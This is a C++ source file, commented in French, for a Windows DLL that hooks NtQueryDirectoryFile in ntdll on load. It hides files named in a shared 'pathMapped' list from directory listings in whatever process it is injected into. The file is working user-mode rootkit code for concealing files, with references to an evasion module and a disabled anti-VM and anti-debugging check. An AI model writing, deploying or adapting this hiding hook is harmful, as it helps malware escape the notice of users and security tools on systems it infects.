#include <windows.h>
#include <winternl.h>
#include <string>
#include <vector>
#include <algorithm>
#include "../../include/IPCObjects_File.h"
#include "../../include/InlineHook.h"
#include "../../include/Evasion.h"

using namespace std;

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_NO_MORE_FILES ((NTSTATUS)0x80000006L)

typedef NTSTATUS(NTAPI *NtQueryDirectoryFile_t)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan);

HookContext g_hookContext = {0};
NtQueryDirectoryFile_t pOriginalFunc = NULL;

NTSTATUS NTAPI HookedNtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan)
{
    // Call original function via trampoline
    if (!pOriginalFunc)
    {
        return STATUS_NO_MORE_FILES;
    }

    NTSTATUS status = pOriginalFunc(
        FileHandle, Event, ApcRoutine, ApcContext,
        IoStatusBlock, FileInformation, Length,
        FileInformationClass, ReturnSingleEntry,
        FileName, RestartScan);

    if (!NT_SUCCESS(status) || FileInformationClass != FileDirectoryInformation)
    {
        return status;
    }

    // Charger la liste des chemins à cacher
    vector<wstring> hiddenPaths;
    try
    {
        hiddenPaths = deserializeWStringVector(L"pathMapped");
    }
    catch (...)
    {
        return status;
    }

    if (hiddenPaths.empty())
    {
        return status;
    }

    // Filtrer la liste chaînée FILE_DIRECTORY_INFORMATION
    PFILE_DIRECTORY_INFORMATION pCurrent = (PFILE_DIRECTORY_INFORMATION)FileInformation;
    PFILE_DIRECTORY_INFORMATION pPrevious = NULL;

    while (pCurrent)
    {
        // Extraire le nom du fichier
        wstring fileName(pCurrent->FileName, pCurrent->FileNameLength / sizeof(WCHAR));

        // Convertir en minuscules pour comparaison insensible à la casse
        transform(fileName.begin(), fileName.end(), fileName.begin(), ::towlower);

        BOOL shouldHide = FALSE;
        for (const auto &hiddenPath : hiddenPaths)
        {
            wstring hiddenLower = hiddenPath;
            transform(hiddenLower.begin(), hiddenLower.end(), hiddenLower.begin(), ::towlower);

            // Vérifier si le nom contient le chemin caché
            if (fileName.find(hiddenLower) != wstring::npos || hiddenLower.find(fileName) != wstring::npos)
            {
                shouldHide = TRUE;
                break;
            }
        }

        if (shouldHide)
        {
            // Supprimer cette entrée de la liste chaînée
            if (pPrevious)
            {
                if (pCurrent->NextEntryOffset == 0)
                {
                    // Dernière entrée
                    pPrevious->NextEntryOffset = 0;
                    break;
                }
                else
                {
                    // Sauter l'entrée actuelle
                    pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                    pCurrent = (PFILE_DIRECTORY_INFORMATION)((BYTE *)pCurrent + pCurrent->NextEntryOffset);
                    continue;
                }
            }
            else
            {
                // Première entrée
                if (pCurrent->NextEntryOffset == 0)
                {
                    // Seule entrée - retourner liste vide
                    return STATUS_NO_MORE_FILES;
                }
                else
                {
                    // Copier la prochaine entrée au début
                    PFILE_DIRECTORY_INFORMATION pNext = (PFILE_DIRECTORY_INFORMATION)((BYTE *)pCurrent + pCurrent->NextEntryOffset);
                    ULONG bytesToCopy = Length - pCurrent->NextEntryOffset;
                    memmove(pCurrent, pNext, bytesToCopy);
                    continue;
                }
            }
        }

        // Passer à l'entrée suivante
        if (pCurrent->NextEntryOffset == 0)
        {
            break;
        }

        pPrevious = pCurrent;
        pCurrent = (PFILE_DIRECTORY_INFORMATION)((BYTE *)pCurrent + pCurrent->NextEntryOffset);
    }

    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{

    switch (dwReason)
    {

    case DLL_PROCESS_ATTACH:
    {
        // Anti-VM and anti-debugging check (disabled in DLL)
        // if (!isSafeEnvironment()) {
        //     return FALSE;
        // }

        DisableThreadLibraryCalls(hModule);

        // Obtenir l'adresse de NtQueryDirectoryFile
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll)
        {
            OutputDebugStringW(L"[fileHooks] Failed to get ntdll.dll");
            return FALSE;
        }

        PVOID pNtQDF = (PVOID)GetProcAddress(hNtdll, "NtQueryDirectoryFile");
        if (!pNtQDF)
        {
            OutputDebugStringW(L"[fileHooks] Failed to get NtQueryDirectoryFile");
            return FALSE;
        }

        // Installer le hook inline
        if (InstallInlineHook(pNtQDF, (PVOID)HookedNtQueryDirectoryFile, &g_hookContext))
        {
            pOriginalFunc = (NtQueryDirectoryFile_t)g_hookContext.trampoline;
            OutputDebugStringW(L"[fileHooks] Inline Hook installed successfully");
        }
        else
        {
            OutputDebugStringW(L"[fileHooks] Failed to install inline hook");
            return FALSE;
        }
    }
    break;

    case DLL_PROCESS_DETACH:
        // Retirer le hook
        UninstallInlineHook(&g_hookContext);
        break;
    }

    return TRUE;
}
